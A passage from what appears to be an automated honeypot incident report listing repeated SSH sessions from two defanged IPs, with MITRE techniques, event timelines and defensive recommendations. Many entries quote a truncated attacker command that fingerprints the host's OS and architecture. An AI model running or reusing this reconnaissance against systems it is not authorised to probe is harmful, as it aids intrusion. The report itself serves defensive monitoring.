| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:08:05` | `cowrie.session.connect` |
| `2026-09-03 11:08:05` | `cowrie.client.version` |
| `2026-09-03 11:08:05` | `cowrie.client.kex` |
| `2026-09-03 11:08:06` | `cowrie.login.success` |
| `2026-09-03 11:08:06` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:08:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 11:08:06` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:08:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d563fd939b8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:09 |
| **Last Seen** | 2026-09-03 11:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:09:04` | `cowrie.session.connect` |
| `2026-09-03 11:09:04` | `cowrie.client.version` |
| `2026-09-03 11:09:04` | `cowrie.client.kex` |
| `2026-09-03 11:09:05` | `cowrie.login.success` |
| `2026-09-03 11:09:06` | `cowrie.session.params` |
| `2026-09-03 11:09:06` | `cowrie.command.input` |
| `2026-09-03 11:09:06` | `cowrie.command.input` |
| `2026-09-03 11:09:06` | `cowrie.command.input` |
| `2026-09-03 11:09:06` | `cowrie.command.input` |
| `2026-09-03 11:09:06` | `cowrie.command.input` |
| `2026-09-03 11:09:06` | `cowrie.command.success` |
| `2026-09-03 11:09:06` | `cowrie.command.input` |
| `2026-09-03 11:09:06` | `cowrie.command.input` |
| `2026-09-03 11:09:06` | `cowrie.command.input` |
| `2026-09-03 11:09:06` | `cowrie.command.input` |
| `2026-09-03 11:09:06` | `cowrie.log.closed` |
| `2026-09-03 11:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdfc8bf1c412

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:10 |
| **Last Seen** | 2026-09-03 11:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:10:16` | `cowrie.session.connect` |
| `2026-09-03 11:10:16` | `cowrie.client.version` |
| `2026-09-03 11:10:16` | `cowrie.client.kex` |
| `2026-09-03 11:10:17` | `cowrie.login.success` |
| `2026-09-03 11:10:18` | `cowrie.session.params` |
| `2026-09-03 11:10:18` | `cowrie.command.input` |
| `2026-09-03 11:10:18` | `cowrie.command.input` |
| `2026-09-03 11:10:18` | `cowrie.command.input` |
| `2026-09-03 11:10:18` | `cowrie.command.input` |
| `2026-09-03 11:10:18` | `cowrie.command.input` |
| `2026-09-03 11:10:18` | `cowrie.command.success` |
| `2026-09-03 11:10:18` | `cowrie.command.input` |
| `2026-09-03 11:10:18` | `cowrie.command.input` |
| `2026-09-03 11:10:18` | `cowrie.command.input` |
| `2026-09-03 11:10:18` | `cowrie.command.input` |
| `2026-09-03 11:10:18` | `cowrie.log.closed` |
| `2026-09-03 11:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dda59dc9ba5e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:11 |
| **Last Seen** | 2026-09-03 11:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:11:29` | `cowrie.session.connect` |
| `2026-09-03 11:11:29` | `cowrie.client.version` |
| `2026-09-03 11:11:29` | `cowrie.client.kex` |
| `2026-09-03 11:11:30` | `cowrie.login.success` |
| `2026-09-03 11:11:30` | `cowrie.session.params` |
| `2026-09-03 11:11:30` | `cowrie.command.input` |
| `2026-09-03 11:11:30` | `cowrie.command.input` |
| `2026-09-03 11:11:30` | `cowrie.command.input` |
| `2026-09-03 11:11:30` | `cowrie.command.input` |
| `2026-09-03 11:11:30` | `cowrie.command.input` |
| `2026-09-03 11:11:30` | `cowrie.command.success` |
| `2026-09-03 11:11:30` | `cowrie.command.input` |
| `2026-09-03 11:11:30` | `cowrie.command.input` |
| `2026-09-03 11:11:30` | `cowrie.command.input` |
| `2026-09-03 11:11:30` | `cowrie.command.input` |
| `2026-09-03 11:11:31` | `cowrie.log.closed` |
| `2026-09-03 11:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c77b4364451e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 11:12 |
| **Last Seen** | 2026-09-03 11:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:12:43` | `cowrie.session.connect` |
| `2026-09-03 11:12:43` | `cowrie.client.version` |
| `2026-09-03 11:12:43` | `cowrie.client.kex` |
| `2026-09-03 11:12:44` | `cowrie.login.success` |
| `2026-09-03 11:12:44` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:12:45` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 11:12:45` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc0355df962

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:12 |
| **Last Seen** | 2026-09-03 11:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:12:45` | `cowrie.session.connect` |
| `2026-09-03 11:12:46` | `cowrie.client.version` |
| `2026-09-03 11:12:46` | `cowrie.client.kex` |
| `2026-09-03 11:12:46` | `cowrie.login.success` |
| `2026-09-03 11:12:47` | `cowrie.session.params` |
| `2026-09-03 11:12:47` | `cowrie.command.input` |
| `2026-09-03 11:12:47` | `cowrie.command.input` |
| `2026-09-03 11:12:47` | `cowrie.command.input` |
| `2026-09-03 11:12:47` | `cowrie.command.input` |
| `2026-09-03 11:12:47` | `cowrie.command.input` |
| `2026-09-03 11:12:47` | `cowrie.command.success` |
| `2026-09-03 11:12:47` | `cowrie.command.input` |
| `2026-09-03 11:12:47` | `cowrie.command.input` |
| `2026-09-03 11:12:47` | `cowrie.command.input` |
| `2026-09-03 11:12:47` | `cowrie.command.input` |
| `2026-09-03 11:12:47` | `cowrie.log.closed` |
| `2026-09-03 11:12:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1669752540ac

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:14 |
| **Last Seen** | 2026-09-03 11:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:14:11` | `cowrie.session.connect` |
| `2026-09-03 11:14:11` | `cowrie.client.version` |
| `2026-09-03 11:14:11` | `cowrie.client.kex` |
| `2026-09-03 11:14:12` | `cowrie.login.success` |
| `2026-09-03 11:14:13` | `cowrie.session.params` |
| `2026-09-03 11:14:13` | `cowrie.command.input` |
| `2026-09-03 11:14:13` | `cowrie.command.input` |
| `2026-09-03 11:14:13` | `cowrie.command.input` |
| `2026-09-03 11:14:13` | `cowrie.command.input` |
| `2026-09-03 11:14:13` | `cowrie.command.input` |
| `2026-09-03 11:14:13` | `cowrie.command.success` |
| `2026-09-03 11:14:13` | `cowrie.command.input` |
| `2026-09-03 11:14:13` | `cowrie.command.input` |
| `2026-09-03 11:14:13` | `cowrie.command.input` |
| `2026-09-03 11:14:13` | `cowrie.command.input` |
| `2026-09-03 11:14:13` | `cowrie.log.closed` |
| `2026-09-03 11:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97291c65fdf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:15 |
| **Last Seen** | 2026-09-03 11:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:15:21` | `cowrie.session.connect` |
| `2026-09-03 11:15:21` | `cowrie.client.version` |
| `2026-09-03 11:15:21` | `cowrie.client.kex` |
| `2026-09-03 11:15:22` | `cowrie.login.success` |
| `2026-09-03 11:15:24` | `cowrie.session.params` |
| `2026-09-03 11:15:24` | `cowrie.command.input` |
| `2026-09-03 11:15:24` | `cowrie.command.input` |
| `2026-09-03 11:15:24` | `cowrie.command.input` |
| `2026-09-03 11:15:24` | `cowrie.command.input` |
| `2026-09-03 11:15:24` | `cowrie.command.input` |
| `2026-09-03 11:15:24` | `cowrie.command.success` |
| `2026-09-03 11:15:24` | `cowrie.command.input` |
| `2026-09-03 11:15:24` | `cowrie.command.input` |
| `2026-09-03 11:15:24` | `cowrie.command.input` |
| `2026-09-03 11:15:24` | `cowrie.command.input` |
| `2026-09-03 11:15:24` | `cowrie.log.closed` |
| `2026-09-03 11:15:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2791262823d2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:16 |
| **Last Seen** | 2026-09-03 11:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:16:24` | `cowrie.session.connect` |
| `2026-09-03 11:16:24` | `cowrie.client.version` |
| `2026-09-03 11:16:24` | `cowrie.client.kex` |
| `2026-09-03 11:16:26` | `cowrie.login.success` |
| `2026-09-03 11:16:27` | `cowrie.session.params` |
| `2026-09-03 11:16:27` | `cowrie.command.input` |
| `2026-09-03 11:16:27` | `cowrie.command.input` |
| `2026-09-03 11:16:27` | `cowrie.command.input` |
| `2026-09-03 11:16:27` | `cowrie.command.input` |
| `2026-09-03 11:16:27` | `cowrie.command.input` |
| `2026-09-03 11:16:27` | `cowrie.command.success` |
| `2026-09-03 11:16:27` | `cowrie.command.input` |
| `2026-09-03 11:16:27` | `cowrie.command.input` |
| `2026-09-03 11:16:27` | `cowrie.command.input` |
| `2026-09-03 11:16:27` | `cowrie.command.input` |
| `2026-09-03 11:16:27` | `cowrie.log.closed` |
| `2026-09-03 11:16:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fec7e3bc61f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:17 |
| **Last Seen** | 2026-09-03 11:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:17:31` | `cowrie.session.connect` |
| `2026-09-03 11:17:31` | `cowrie.client.version` |
| `2026-09-03 11:17:31` | `cowrie.client.kex` |
| `2026-09-03 11:17:32` | `cowrie.login.success` |
| `2026-09-03 11:17:33` | `cowrie.session.params` |
| `2026-09-03 11:17:33` | `cowrie.command.input` |
| `2026-09-03 11:17:33` | `cowrie.command.input` |
| `2026-09-03 11:17:33` | `cowrie.command.input` |
| `2026-09-03 11:17:33` | `cowrie.command.input` |
| `2026-09-03 11:17:33` | `cowrie.command.input` |
| `2026-09-03 11:17:33` | `cowrie.command.success` |
| `2026-09-03 11:17:33` | `cowrie.command.input` |
| `2026-09-03 11:17:33` | `cowrie.command.input` |
| `2026-09-03 11:17:33` | `cowrie.command.input` |
| `2026-09-03 11:17:33` | `cowrie.command.input` |
| `2026-09-03 11:17:34` | `cowrie.log.closed` |
| `2026-09-03 11:17:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d3b60e9fe11

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:18 |
| **Last Seen** | 2026-09-03 11:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:18:41` | `cowrie.session.connect` |
| `2026-09-03 11:18:41` | `cowrie.client.version` |
| `2026-09-03 11:18:41` | `cowrie.client.kex` |
| `2026-09-03 11:18:42` | `cowrie.login.success` |
| `2026-09-03 11:18:42` | `cowrie.session.params` |
| `2026-09-03 11:18:42` | `cowrie.command.input` |
| `2026-09-03 11:18:42` | `cowrie.command.input` |
| `2026-09-03 11:18:42` | `cowrie.command.input` |
| `2026-09-03 11:18:42` | `cowrie.command.input` |
| `2026-09-03 11:18:42` | `cowrie.command.input` |
| `2026-09-03 11:18:42` | `cowrie.command.success` |
| `2026-09-03 11:18:42` | `cowrie.command.input` |
| `2026-09-03 11:18:42` | `cowrie.command.input` |
| `2026-09-03 11:18:43` | `cowrie.command.input` |
| `2026-09-03 11:18:43` | `cowrie.command.input` |
| `2026-09-03 11:18:43` | `cowrie.log.closed` |
| `2026-09-03 11:18:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad8b39864e9

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 11:18 |
| **Last Seen** | 2026-09-03 11:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:18:47` | `cowrie.session.connect` |
| `2026-09-03 11:18:47` | `cowrie.client.version` |
| `2026-09-03 11:18:47` | `cowrie.client.kex` |
| `2026-09-03 11:18:48` | `cowrie.login.success` |
| `2026-09-03 11:18:48` | `cowrie.direct-tcpip.request` |
| `2026-09-03 11:18:48` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 11:18:48` | `cowrie.direct-tcpip.data` |
| `2026-09-03 11:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-331b98860130

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:19 |
| **Last Seen** | 2026-09-03 11:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:19:46` | `cowrie.session.connect` |
| `2026-09-03 11:19:47` | `cowrie.client.version` |
| `2026-09-03 11:19:47` | `cowrie.client.kex` |
| `2026-09-03 11:19:48` | `cowrie.login.success` |
| `2026-09-03 11:19:49` | `cowrie.session.params` |
| `2026-09-03 11:19:49` | `cowrie.command.input` |
| `2026-09-03 11:19:49` | `cowrie.command.input` |
| `2026-09-03 11:19:49` | `cowrie.command.input` |
| `2026-09-03 11:19:49` | `cowrie.command.input` |
| `2026-09-03 11:19:49` | `cowrie.command.input` |
| `2026-09-03 11:19:49` | `cowrie.command.success` |
| `2026-09-03 11:19:49` | `cowrie.command.input` |
| `2026-09-03 11:19:49` | `cowrie.command.input` |
| `2026-09-03 11:19:49` | `cowrie.command.input` |
| `2026-09-03 11:19:49` | `cowrie.command.input` |
| `2026-09-03 11:19:49` | `cowrie.log.closed` |
| `2026-09-03 11:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec1bcc8c9a71

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-09-03 11:20 |
| **Last Seen** | 2026-09-03 11:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 11:20:55` | `cowrie.session.connect` |
| `2026-09-03 11:20:56` | `cowrie.client.version` |
| `2026-09-03 11:20:56` | `cowrie.client.kex` |
| `2026-09-03 11:20:57` | `cowrie.login.success` |
| `2026-09-03 11:20:57` | `cowrie.session.params` |
| `2026-09-03 11:20:57` | `cowrie.command.input` |
